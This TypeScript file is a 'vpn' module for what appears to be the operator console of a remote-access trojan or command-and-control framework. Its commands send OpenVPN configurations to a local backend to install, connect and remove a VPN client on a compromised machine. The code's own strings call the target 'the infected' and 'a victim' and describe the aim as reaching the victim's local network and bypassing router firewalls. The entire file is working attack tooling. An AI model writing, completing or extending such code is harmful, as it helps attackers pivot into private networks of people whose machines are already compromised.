// vpnModule.ts
import { Command } from '@/Interfaces/Command';
import { Module } from '@/Interfaces/Module';


const connect: Command = {
    execute: async (user, args, addOutput) => {
        const fileInput = document.createElement("input");
        fileInput.type = "file";
        fileInput.accept = ".ovpn";

        fileInput.onchange = async () => {
            const file = fileInput.files?.[0];
            if (!file) {
                addOutput("No VPN configuration file selected.");
                return;
            }

            const userConfirmed = window.confirm("Are you sure you want to connect the infected to the VPN?");
            if (!userConfirmed) {
                addOutput("VPN connection cancelled by user.");
                return;
            }

            addOutput("Connecting to VPN, please wait...");

            const formData = new FormData();
            formData.append("file", file);
            formData.append("id", user.uuid);

            const response = await fetch(`http://localhost:8000/api/modules/vpn/connect?id=${user.uuid}`, {
                method: "POST",
                body: formData,
            });

            if (response.ok) {
                addOutput("Successfully launched VPN connection payload. It may take a few seconds to establish. Use the \"/vpn/status\" command to check the connection status.");
            } else {
                const errorData = await response.json();
                addOutput(`Failed to connect to VPN: ${errorData.detail || response.statusText}`);
            }
        };

        fileInput.click();
    },
    help: "Connect to the VPN. Usage: /vpn/connect"
};

const disconnect: Command = {
    execute: async (user, args, addOutput) => {
        addOutput("Disconnecting from VPN...");
        const response = await fetch("http://localhost:8000/api/modules/vpn/stop?id=" + user.uuid);
        if (!response.ok) {
            addOutput("Failed to disconnect from VPN.");
            return
        }
        addOutput("Disconnected from VPN.");
    },
    help: "Disconnect from the VPN. Usage: /vpn/disconnect"
};

const install: Command = {
    execute: async (user, args, addOutput) => {
        const userConfirmed = confirm("Are you sure you want to install the VPN?");
        if (!userConfirmed) {
            addOutput("VPN installation cancelled.");
            return;
        }
        addOutput("Installing VPN, please wait...");
        const response = await fetch("http://localhost:8000/api/modules/vpn/install?id=" + user.uuid);
        if (!response.ok) {
            const errorData = await response.json();
            addOutput(`Failed to install VPN: ${errorData.detail || response.statusText}`);
            return;
        }

        addOutput("VPN installed successfully.");
    },
    help: "Install the VPN drivers and client. Usage: /vpn/install"
};

const status: Command = {
    execute: async (user, args, addOutput) => {
        addOutput("Getting VPN status, please wait...");
        const response = await fetch("http://localhost:8000/api/modules/vpn/status?id=" + user.uuid);
        if (!response.ok) {
            const errorData = await response.json();
            addOutput(`Failed to get VPN status: ${errorData.detail || response.statusText}`);
            return;
        }

        const data = await response.json();
        addOutput("List of connected interfaces:");

        Object.entries(data).forEach(async ([key, value]) => {
            addOutput(`Network Card Name: "${key}"`);
            addOutput(`IP Address: ${value}`);
        });

        const excluded_interfaces = ["Wi-Fi", "WSL", "Loopback", "Ethernet"];
            

        const probableVPNs = Object.entries(data).filter(
            ([key, _]) => !excluded_interfaces.some(excluded => key.includes(excluded))
        );
    
        if (probableVPNs.length > 0) {
            addOutput("Probable VPN Interface(s):");
            probableVPNs.forEach(async ([key, value]) => {
                addOutput(`Network Card Name: "${key}"`);
                addOutput(`IP Address: ${value}`);
            });
        } else {
            addOutput("No probable VPN interface found.");
        }

    },
    help: "Check the VPN connection status. Usage: /vpn/status"
};

const uninstall: Command = {
    execute: async (user, args, addOutput) => {
        addOutput("Uninstalling VPN, please wait...");
        const response = await fetch("http://localhost:8000/api/modules/vpn/uninstall?id=" + user.uuid);
        if (!response.ok) {
            const errorData = await response.json();
            addOutput(`Failed to uninstall VPN: ${errorData.detail || response.statusText}`);
            return;
        }

        addOutput("VPN uninstalled successfully.");
    },
    help: "Uninstall the VPN drivers and client. Usage: /vpn/uninstall"
};

export const vpnModule: Module = {
    commands: {
        connect,
        disconnect,
        status,
        install,
        uninstall
    },
    help: `This module is to manage the VPN connection for a victim.\n
    This is unseful for enabling local network connection and be able to bypass router firewalls.
    `
};